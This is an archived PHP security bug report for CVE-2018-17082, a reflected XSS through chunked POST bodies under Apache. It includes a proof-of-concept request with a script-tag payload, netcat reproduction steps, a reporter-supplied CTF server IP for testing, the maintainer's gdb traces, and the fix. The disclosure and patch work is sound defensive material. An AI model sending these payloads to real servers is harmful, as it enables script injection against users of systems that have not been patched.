---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-10-20_original-report.md
original_filename: 2018-10-20_original-report.md
title: Original report
category: documents
detected_topics:
- xss
- command-injection
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- supply-chain
language: en
raw_sha256: 41cc5817f8a12f5d65620f3cc925669d7e3abb792c0b20da50f5d863973f0eb4
text_sha256: b94b7bf2804d273d5ba056155cde0bda45c3a8e13bb5b2c3be837536b1e84444
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Original report

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-10-20_original-report.md
- Source Type: markdown
- Detected Topics: xss, command-injection, supply-chain
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `41cc5817f8a12f5d65620f3cc925669d7e3abb792c0b20da50f5d863973f0eb4`
- Text SHA256: `b94b7bf2804d273d5ba056155cde0bda45c3a8e13bb5b2c3be837536b1e84444`


## Content

---
title: "Original report"
page_title: "PHP :: Sec Bug #76582 :: XSS due to the header Transfer-Encoding: chunked"
url: "https://bugs.php.net/bug.php?id=76582"
final_url: "https://bugs.php.net/bug.php?id=76582"
authors: ["Prashanth Varma (@cymtrick)"]
programs: ["PHP"]
bugs: ["XSS"]
publication_date: "2018-10-20"
added_date: "2022-10-28"
source: "pentester.land/writeups.json"
original_index: 5637
---

[![Bugs](images/logo.png)](/) |  [php.net](https://php.net/) | [support](https://php.net/support.php) | [documentation](https://php.net/docs.php) | [report a bug](report.php) | [advanced search](search.php) | [search howto](search-howto.php) | [statistics](stats.php) | [random bug](random) | [login](login.php)  
---|---  
go to bug id or search bugs for  
| [Sec Bug](bug.php?id=76582) #76582 | XSS due to the header Transfer-Encoding: chunked  
---|---  
Submitted: | 2018-07-05 15:47 UTC | Modified: | 2018-09-16 14:51 UTC |  
From: | varma dot prashanth at hotmail dot com | Assigned: | [stas](search.php?cmd=display&assign=stas) ([profile](https://people.php.net/stas))  
Status: | Closed | Package: | [Apache2 related](search.php?cmd=display&package_name\[\]=Apache2+related)  
PHP Version: | Any | OS: | Any  
Private report: | No | CVE-ID: | [2018-17082](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17082)  
  
View [Developer](bug.php?id=76582&edit=1) [Edit](bug.php?id=76582&edit=2)

**[2018-07-05 15:47 UTC] varma dot prashanth at hotmail dot com**
  
  
  Description:
  ------------
  Because of (Transfer-Encoding: Chunked) header php is echoing the body as response. This exploit doesn't need any authentication and can be exploited via POST request.
  
  XSS tested on current versions of Chrome and Firefox Quantum. 
  
  
  
  > This vulnerability is tested on apache versions 2.4.18 and 2.4.33.
  >
  > Reproducing steps :
  >
  
  > 1) Intercept the request in burp suite to modify headers
  >
  > GET /lol.php HTTP/1.1
  > Host: localhost
  > User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0
  > Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  > Accept-Language: en-US,en;q=0.5
  > Connection: close
  > Upgrade-Insecure-Requests: 1
  > Cache-Control: max-age=0
  >
  > 2) Modify the request to
  >
  > POST /lol.php HTTP/1.1
  > Host: localhost
  > User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0
  > Accept-Language: en-US,en;q=0.5
  > Content-Type: application/json
  > Upgrade-Insecure-Requests: 1
  > Cache-Control: max-age=0
  > Transfer-Encoding: chunked
  > Content-Length: 25
  >
  > <script>alert(1)</script>
  >
  > 3) Response for the request
  >
  > HTTP/1.1 200 OK
  > Date: Mon, 02 Jul 2018 05:23:16 GMT
  > Server: Apache/2.4.33 (Unix) PHP/7.1.17
  > X-Powered-By: PHP/7.1.17
  > Content-Length: 39
  > Connection: close
  > Content-Type: text/html; charset=UTF-8
  >
  > "{'hack':'1'}"<script>alert(1)</script> 
  
  Test script:
  ---------------
  >
  > <?php
  > function respond_with($header, $body) {
  > header($header);
  >
  > die(json_encode($body));
  > }
  > $body = "{'hack':'1'}";
  > $header = "200 Status Ok";
  > respond_with($header,$body);
  > ?>
  >
  
  Expected result:
  ----------------
  > HTTP/1.1 200 OK
  > Date: Mon, 02 Jul 2018 05:23:16 GMT
  > Server: Apache/2.4.33 (Unix) PHP/7.1.17
  > X-Powered-By: PHP/7.1.17
  > Content-Length: 39
  > Connection: close
  > Content-Type: text/html; charset=UTF-8
  >
  > "{'hack':'1'}"
  
  Actual result:
  --------------
  > HTTP/1.1 200 OK
  > Date: Mon, 02 Jul 2018 05:23:16 GMT
  > Server: Apache/2.4.33 (Unix) PHP/7.1.17
  > X-Powered-By: PHP/7.1.17
  > Content-Length: 39
  > Connection: close
  > Content-Type: text/html; charset=UTF-8
  >
  > "{'hack':'1'}"<script>alert(1)</script> 
  
  

## Patches

## Pull Requests

## History

AllCommentsChangesGit/SVN commitsRelated reports

**[2018-07-05 15:50 UTC] prashanth at defmax dot io**
  
  
  Found this vulnerability while playing h1-702 ctf(capture the flag). Here is the link 159.203.178.9/rpc.php for easy repo.
  
  TCP request for testing on the server:
  
  POST /rpc.php HTTP/1.1
  Host: 159.203.178.9
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0
  Content-Type: application/json
  Transfer-Encoding: chunked
  Content-Length: 27
  
  <script>alert(1)</script>
  

**[2018-07-06 17:37 UTC] prashanth at defmax dot io**

-Operating System: Mac OS 10.14 Ubuntu 16.04lts +Operating System: Any -PHP Version: 7.1Git-2018-07-05 (Git) +PHP Version: Any

**[2018-07-06 17:37 UTC] prashanth at defmax dot io**
  
  
  Working on all versions
  

**[2018-07-08 11:06 UTC] prashanth at defmax dot io**
  
  
  I don't know why it is only producible with apache and php together. Ngnix and php gives a 400 error. I need help to find out the root cause for the issue.
  

**[2018-07-08 19:16 UTC][stas@php.net](//people.php.net/stas)**
  
  
  I tried reproducing it and I do not see the effect you are describing. I am getting this from Apache:
  
  HTTP/1.1 400 Bad Request
  Date: Sun, 08 Jul 2018 19:15:33 GMT
  Server: Apache/2.4.33 (Unix) PHP/7.1.0-dev
  Content-Length: 226
  Connection: close
  Content-Type: text/html; charset=iso-8859-1
  
  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>400 Bad Request</title>
  </head><body>
  <h1>Bad Request</h1>
  <p>Your browser sent a request that this server could not understand.<br />
  </p>
  </body></html>
  

**[2018-07-08 19:20 UTC][stas@php.net](//people.php.net/stas)**

-Status: Open +Status: Feedback -Package: Output Control +Package: Apache2 related

**[2018-07-08 19:20 UTC][stas@php.net](//people.php.net/stas)**
  
  
  I suspect there is some additional thing involved here, can you reproduce the same by just sending the data to Apache with netcat (nc)?
  

**[2018-07-09 06:11 UTC] prashanth at defmax dot io**

-Status: Feedback +Status: Open

**[2018-07-09 06:11 UTC] prashanth at defmax dot io**
  
  
  I think there is a clrf character after html tag so that script tag is jumping to terminal input. Try with script tag and it will definitely work. it will work best in burp suite and it will help to see output in the browser. 
  
  Prashanths-MacBook-Pro:~ prashanthvarma$ nc localhost 80
  POST /lol.php HTTP/1.1
  Host: localhost
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0
  Accept-Language: en-US,en;q=0.5
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Cache-Control: max-age=0
  Transfer-Encoding: chunked
  Content-Length: 25
  
  <script>alert(1)</script>HTTP/1.1 400 Bad Request
  Date: Mon, 09 Jul 2018 06:08:22 GMT
  Server: Apache/2.4.33 (Unix) PHP/7.1.17
  Content-Length: 226
  Connection: close
  Content-Type: text/html; charset=iso-8859-1
  
  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>400 Bad Request</title>
  </head><body>
  <h1>Bad Request</h1>
  <p>Your browser sent a request that this server could not understand.<br />
  </p>
  </body></html>
  Prashanths-MacBook-Pro:~ prashanthvarma$ <script>alert(1)</script>
  

**[2018-07-09 06:23 UTC] prashanth at defmax dot io**
  
  
  I am just attaching a Proof of Concept video <https://drive.google.com/file/d/1DZI90dnsncQxXuGjE6MAGTqI3s8xHIno/view?usp=sharing>
  

**[2018-07-09 07:04 UTC][stas@php.net](//people.php.net/stas)**

-Status: Open +Status: Feedback

**[2018-07-09 07:04 UTC][stas@php.net](//people.php.net/stas)**
  
  
  In the video, you are using some kind of a tool as proxy. I have no idea what that tool is doing, but I can not reproduce this without any tools with plain nc. So I suspect something is going on with this tool. Please try reporducing without any tools in between, just directly communicating to the server.
  

**[2018-07-09 07:35 UTC] prashanth at defmax dot io**

-Status: Feedback +Status: Open

**[2018-07-09 07:35 UTC] prashanth at defmax dot io**
  
  
  I reproduced with nc and mozilla developer tools it is working perfectly. I am just attaching other proof of concept. burp suite(proxy) only intercepts the request to modify.
  
  <https://drive.google.com/file/d/1P_Ciw8trmaszbCWCkmsHpSCC87zmkXuR/view?usp=sharing>
  
  Because of clrf the nc is exiting and jumping the script tag to the input as shown in the video. Other wise bug is clearly reproducible. Used proxies because it can make process easy,
  

**[2018-07-09 22:41 UTC][stas@php.net](//people.php.net/stas)**

-Status: Open +Status: Verified

**[2018-07-09 22:41 UTC][stas@php.net](//people.php.net/stas)**
  
  
  Looks like I can reproduce it now. I am not sure yet how the input ends up in the output though, it doesn't seem like PHP is sending it, but it's located in Apache's iovec buffers for output:
  
  #1  0x00007f511550494a in apr_socket_sendv (sock=sock@entry=0x7f5115c230a0, vec=vec@entry=0x7fffa5bf4f80, nvec=nvec@entry=3,
  len=len@entry=0x7fffa5bf4ee0) at ./network_io/unix/sendrecv.c:212
  #2  0x0000557484512389 in writev_nonblocking (s=s@entry=0x7f5115c230a0, vec=0x7fffa5bf4f80, nvec=3, bb=0x7f5115c23910,
  cumulative_bytes_written=0x7f5115c23848, c=0x7f5115c23290) at core_filters.c:787
  #3  0x0000557484512684 in send_brigade_nonblocking (s=s@entry=0x7f5115c230a0, bb=bb@entry=0x7f5115c23910,
  bytes_written=bytes_written@entry=0x7f5115c23848, c=c@entry=0x7f5115c23290) at core_filters.c:704
  #4  0x00005574845133c1 in send_brigade_blocking (c=0x7f5115c23290, bytes_written=0x7f5115c23848, bb=0x7f5115c23910, s=0x7f5115c230a0)
  at core_filters.c:733
  #5  ap_core_output_filter (f=0x7f5115c236e8, new_bb=0x7f5115c23910) at core_filters.c:542
  #6  0x000055748452ff61 in ap_process_request (r=r@entry=0x7f5115c050a0) at http_request.c:477
  
  (gdb) p vec[2]
  $4 = {iov_base = 0x7f5115c1b17b, iov_len = 27}
  (gdb) p (char *)0x7f5115c1b17b
  $5 = 0x7f5115c1b17b "<script>alert(1)</script>\r\n"
  
  So somehow this gets into Apache's "bucket brigade", even though PHP is not sending it there directly (in fact, it never sees the input since Apache doesn't let it to read it, throwing an error in ap_http_filter instead:
  
  #0  apr_brigade_write (b=0x7f5115c18810, flush=0x5574844fcef0 <ap_filter_flush>, ctx=0x7f5115c1a548,  
  str=0x557484546fc0 "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>", nbyte=71) at ./buckets/apr_brigade.c:433  
  #1  0x00005574844feebc in buffer_output (r=<optimized out>, str=<optimized out>, len=<optimized out>) at protocol.c:1898
  #2  0x0000557484500d9e in ap_rvputs (r=r@entry=0x7f5115c190a0) at protocol.c:2022  
  #3  0x000055748452dde0 in ap_send_error_response (r=0x7f5115c190a0, recursive_error=0) at http_protocol.c:1539  
  #4  0x0000557484532eb6 in ap_http_header_filter (f=0x7f5115c1a570, b=0x7f5115c186e0) at http_filters.c:1335  
  #5  0x0000557484500832 in ap_content_length_filter (f=0x7f5115c1a548, b=0x7f5115c186e0) at protocol.c:1769  
  #6  0x000055748453415a in ap_byterange_filter (f=0x7f5115c1a520, bb=0x7f5115c186e0) at byterange_filter.c:494  
  #7  0x00007f51130855f4 in deflate_out_filter (f=<optimized out>, bb=0x7f5115c186e0) at mod_deflate.c:831
  #8  0x00007f511285f10a in filter_harness (f=0x7f5115c17860, bb=0x7f5115c186e0) at mod_filter.c:323  
  #9  0x00005574845312df in ap_http_filter (f=<optimized out>, b=0x7f5115c18540, mode=<optimized out>, block=<optimized out>, readbytes=16384)  
  at http_filters.c:555  
  #10 0x00007f5111cf941f in php_apache_sapi_read_post (buf=0x7fffa5bf0500 "", count_bytes=16384) at ./sapi/apache2handler/sapi_apache2.c:198
  #11 0x00007f5111c09d28 in sapi_read_post_block (buffer=buffer@entry=0x7fffa5bf0500 "", buflen=buflen@entry=16384) at ./main/SAPI.c:248  
  #12 0x00007f5111c0a77d in sapi_deactivate () at ./main/SAPI.c:513  
  #13 0x00007f5111c00ab9 in php_request_shutdown (dummy=dummy@entry=0x0) at ./main/main.c:1863  
  
  I'll have to dig more into it to see how this output ends up there.
  

**[2018-07-16 19:53 UTC][stas@php.net](//people.php.net/stas)**
  
  
  It looks like the reason for the problem is this code in sapi_apache2.c:
  
  if (!parent_req) {
  php_apache_request_dtor(r);
  ctx->request_processed = 1;
  bucket = apr_bucket_eos_create(r->connection->bucket_alloc);
  APR_BRIGADE_INSERT_TAIL(brigade, bucket);
  
  
  "brigade" here is one that is initialized way above in the request. But I suspect this brigade gets destroyed later by one of the Apache handlers when the input consumption fails. Applying this seems to fix the problem:
  
  diff --git a/sapi/apache2handler/sapi_apache2.c b/sapi/apache2handler/sapi_apache2.c
  index e7edcab6da..b2b3340826 100644
  --- a/sapi/apache2handler/sapi_apache2.c
  +++ b/sapi/apache2handler/sapi_apache2.c
  @@ -724,6 +724,7 @@ zend_first_try {
  php_apache_request_dtor(r);
  ctx->request_processed = 1;
  bucket = apr_bucket_eos_create(r->connection->bucket_alloc);
  +  brigade = apr_brigade_create(r->pool, r->connection->bucket_alloc);
  APR_BRIGADE_INSERT_TAIL(brigade, bucket);
  
  rv = ap_pass_brigade(r->output_filters, brigade);
  
  Could you please verify that it fixes the issue for you too?
  

**[2018-07-16 20:01 UTC][stas@php.net](//people.php.net/stas)**
  
  
  Not sure this is the correct patch though because in regular case this means the brigade allocated in the request per above is not cleaned :( It looks like we need some smarter way to handle this but not sure yet how.
  

**[2018-07-21 12:45 UTC] prashanth at defmax dot io**
  
  
  Just verified the patch on php 7.1.7. I am not able reproduce.
  
  Patch applied:
  
  if (!parent_req) {
  zend_first_try {
  php_apache_request_dtor(r);
  ctx->request_processed = 1;
  bucket = apr_bucket_eos_create(r->connection->bucket_alloc);
  brigade = apr_brigade_create(r->pool, r->connection->bucket_alloc);
  APR_BRIGADE_INSERT_TAIL(brigade, bucket);
  
  rv = ap_pass_brigade(r->output_filters, brigade);
  if (rv != APR_SUCCESS || r->connection->aborted) {
  zend_first_try {
  php_handle_aborted_connection();
  } zend_end_try();
  }
  apr_brigade_cleanup(brigade);
  apr_pool_cleanup_run(r->pool, (void *)&SG(server_context), php_server_context_cleanup);
  }zend_end_try();
  }
  

**[2018-07-21 12:49 UTC] prashanth at defmax dot io**
  
  
  -->I am not able to reproduce the issue. I think issue is fixed on my side.
  

**[2018-07-29 05:08 UTC][stas@php.net](//people.php.net/stas)**
  
  
  I think better fix would be to do:
  
  apr_brigade_cleanup(brigade);
  
  instead of:
  
  bucket = apr_bucket_eos_create(r->connection->bucket_alloc);
  
  Could you verify this fixes the issue too?
  

**[2018-07-29 05:09 UTC][stas@php.net](//people.php.net/stas)**
  
  
  Sorry, instead of:
  
  brigade = apr_brigade_create(r->pool, r->connection->bucket_alloc);
  
  (i.e. clean the brigade instead of creating the new one)
  

**[2018-07-29 05:19 UTC][stas@php.net](//people.php.net/stas)**

-Assigned To: +Assigned To: stas

**[2018-07-29 05:19 UTC][stas@php.net](//people.php.net/stas)**
  
  
  Fix added to security repo as 65bc4f464e6a85aad3f578e9d55520601cbdeccf and to <https://gist.github.com/smalyshev/e956dbae936df9a7594750caae8a7cf2>
  

**[2018-07-29 05:19 UTC][stas@php.net](//people.php.net/stas)**

-CVE-ID: +CVE-ID: needed

**[2018-07-29 05:24 UTC] prashanth at defmax dot io**
  
  
  patch is working. applied apr_brigade_cleanup(brigade);
  
  if (!parent_req) {
  zend_first_try {
  php_apache_request_dtor(r);
  ctx->request_processed = 1;
  bucket = apr_bucket_eos_create(r->connection->bucket_alloc);
  apr_brigade_cleanup(brigade);
  APR_BRIGADE_INSERT_TAIL(brigade, bucket);
  
  rv = ap_pass_brigade(r->output_filters, brigade);
  if (rv != APR_SUCCESS || r->connection->aborted) {
  zend_first_try {
  php_handle_aborted_connection();
  } zend_end_try();
  

**[2018-08-22 06:53 UTC] varma dot prashanth at hotmail dot com**

-: prashanth at defmax dot io +: varma dot prashanth at hotmail dot com

**[2018-08-22 06:53 UTC] varma dot prashanth at hotmail dot com**
  
  
  mail change
  

**[2018-09-09 19:54 UTC][stas@php.net](//people.php.net/stas)**

-Status: Verified +Status: Closed

**[2018-09-09 19:54 UTC][stas@php.net](//people.php.net/stas)**
  
  
  The fix for this bug has been committed.
  
  Snapshots of the sources are packaged every three hours; this change
  will be in the next snapshot. You can grab the snapshot at
  <http://snaps.php.net/>.
  
  For Windows:
  
  <http://windows.php.net/snapshots/>
  
  Thank you for the report, and for helping us make PHP better.
  
  
  

**[2018-09-09 23:46 UTC][cmb@php.net](//people.php.net/cmb)**

-Private report: No +Private report: Yes

**[2018-09-13 13:39 UTC][nikic@php.net](//people.php.net/nikic)**
  
  
  Is this supposed to still be private? This bug shows up in changelogs of released versions.
  

**[2018-09-13 18:46 UTC][stas@php.net](//people.php.net/stas)**
  
  
  No it should not be private, and as far as I see it is not. Looks like bug in changelog reporting here.
  

**[2018-09-13 21:08 UTC][cmb@php.net](//people.php.net/cmb)**
  
  
  I've set it back to private on Sunday, since there was no release available then.
  

**[2018-09-16 14:51 UTC][kaplan@php.net](//people.php.net/kaplan)**

-CVE-ID: needed +CVE-ID: 2018-17082  
  
---  
[![PHP](images/logo-small.gif)](https://php.net/) [Copyright © 2001-2026 The PHP Group](https://php.net/copyright.php)  
All rights reserved.  |  Last updated: Sun Jun 28 05:00:01 2026 UTC
